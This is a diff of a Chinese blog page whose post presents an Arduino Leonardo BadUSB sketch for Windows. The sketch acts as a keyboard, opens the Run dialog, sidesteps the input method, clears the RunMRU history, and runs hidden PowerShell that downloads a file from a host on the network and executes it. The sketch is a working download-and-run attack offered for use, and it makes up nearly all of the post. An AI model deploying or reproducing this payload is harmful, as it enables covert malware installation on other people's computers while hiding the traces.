@@ -5,18 +5,20 @@
     
     <title>基于 Arduino Leonardo 的 BadUSB 下载文件并运行代码 | QWQAQ 的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="Arduino Leonardo 的 BadUSB，适合于 Windows 平台，用 PowerShell 命令下载一个文件，并运行它 1234567891011121314151617181920void setup() &amp;#123;    Keyboard.begin(); // 开始键盘通讯    delay(5000); // 延时    Keyboard.press(KEY_LEFT_G">
+    <meta name="description" content="Arduino Leonardo 的 BadUSB，适合于 Windows 平台，用 PowerShell 命令下载一个文件，并运行它">
 <meta name="keywords" content="Arduino,Arduino Leonardo,BadUSB,安防">
 <meta property="og:type" content="article">
 <meta property="og:title" content="基于 Arduino Leonardo 的 BadUSB 下载文件并运行代码">
 <meta property="og:url" content="http://qwqaq.com/c47492ae.html">
 <meta property="og:site_name" content="QWQAQ 的博客">
-<meta property="og:description" content="Arduino Leonardo 的 BadUSB，适合于 Windows 平台，用 PowerShell 命令下载一个文件，并运行它 1234567891011121314151617181920void setup() &amp;#123;    Keyboard.begin(); // 开始键盘通讯    delay(5000); // 延时    Keyboard.press(KEY_LEFT_G">
+<meta property="og:description" content="Arduino Leonardo 的 BadUSB，适合于 Windows 平台，用 PowerShell 命令下载一个文件，并运行它">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-07-03T08:00:57.316Z">
+<meta property="og:image" content="http://qwqaq.com/images/banner/BadUSB.png">
+<meta property="og:updated_time" content="2019-01-24T03:51:13.267Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="基于 Arduino Leonardo 的 BadUSB 下载文件并运行代码">
-<meta name="twitter:description" content="Arduino Leonardo 的 BadUSB，适合于 Windows 平台，用 PowerShell 命令下载一个文件，并运行它 1234567891011121314151617181920void setup() &amp;#123;    Keyboard.begin(); // 开始键盘通讯    delay(5000); // 延时    Keyboard.press(KEY_LEFT_G">
+<meta name="twitter:description" content="Arduino Leonardo 的 BadUSB，适合于 Windows 平台，用 PowerShell 命令下载一个文件，并运行它">
+<meta name="twitter:image" content="http://qwqaq.com/images/banner/BadUSB.png">
     
 
     
@@ -242,6 +244,14 @@ var _hmt = _hmt || [];
             <section id="main"><article id="post-基于-Arduino-Leonardo-的-BadUSB-下载文件并运行代码" class="article article-type-post" itemscope="" itemprop="blogPost">
     <div class="article-inner">
         
+            
+	
+		<img src="/images/banner/BadUSB.png" class="article-banner">
+	
+
+
+
+        
         
             <header class="article-header">
                 
@@ -279,7 +289,9 @@ var _hmt = _hmt || [];
             
             
             <p>Arduino Leonardo 的 BadUSB，适合于 Windows 平台，用 PowerShell 命令下载一个文件，并运行它</p>
+<a id="more"></a>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Keyboard.begin(); <span class="comment">// 开始键盘通讯</span></span><br><span class="line">    delay(<span class="number">5000</span>); <span class="comment">// 延时</span></span><br><span class="line">    Keyboard.press(KEY_LEFT_GUI); <span class="comment">// win键</span></span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.press(<span class="string">'r'</span>); <span class="comment">// r键</span></span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">    Keyboard.release(<span class="string">'r'</span>);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK); <span class="comment">// 利用开大写输小写绕过输入法</span></span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.println(<span class="string">"cmd /c start /min reg delete hkcu\\software\\microsoft\\windows\\currentversion\\explorer\\runmru /f&amp;cmd /c start /min powershell $p = new-object system.net.webclient;$p.downloadfile('http://192.168.1.111/1.jpg', 'd:\\1.jpg');start d:\\1.jpg;exit"</span>);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK);</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.press(KEY_RETURN);  <span class="comment">// 按下回车键</span></span><br><span class="line">    Keyboard.release(KEY_RETURN); <span class="comment">// 释放回车键</span></span><br><span class="line">    Keyboard.end(); <span class="comment">// 结束键盘通讯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
         
         </div>
         
@@ -299,7 +311,7 @@ var _hmt = _hmt || [];
 
 </div>
 
-    <a data-url="http://qwqaq.com/c47492ae.html" data-id="cjra0dhhp002t40w3w7jrezwg" class="article-share-link"><i class="zmdi zmdi-share"></i>分享到</a>
+    <a data-url="http://qwqaq.com/c47492ae.html" data-id="cjra1ye9f00325sw3i1ofvoar" class="article-share-link"><i class="zmdi zmdi-share"></i>分享到</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
